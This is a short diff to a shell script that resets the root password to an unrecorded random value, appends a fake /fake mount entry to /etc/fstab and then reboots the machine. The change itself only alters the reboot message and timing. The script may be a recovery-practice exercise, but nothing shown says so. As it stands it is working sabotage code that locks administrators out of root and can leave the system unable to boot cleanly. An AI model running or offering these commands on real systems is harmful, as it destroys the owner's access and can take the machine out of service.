@@ -4,9 +4,8 @@ echo `openssl rand -base64 14`|passwd --stdin root
 
 echo "/fake /fake_dir xfs defaults 0 0" >>/etc/fstab
 
-shutdown -r +1 “System rebooting in 1 minutes”
+echo "REBOOTING YOUR SYSTEM. DO NOT PANIC"
 
-echo "REBOOT SYSTEM"
 sleep 2
 shutdown -r now
 
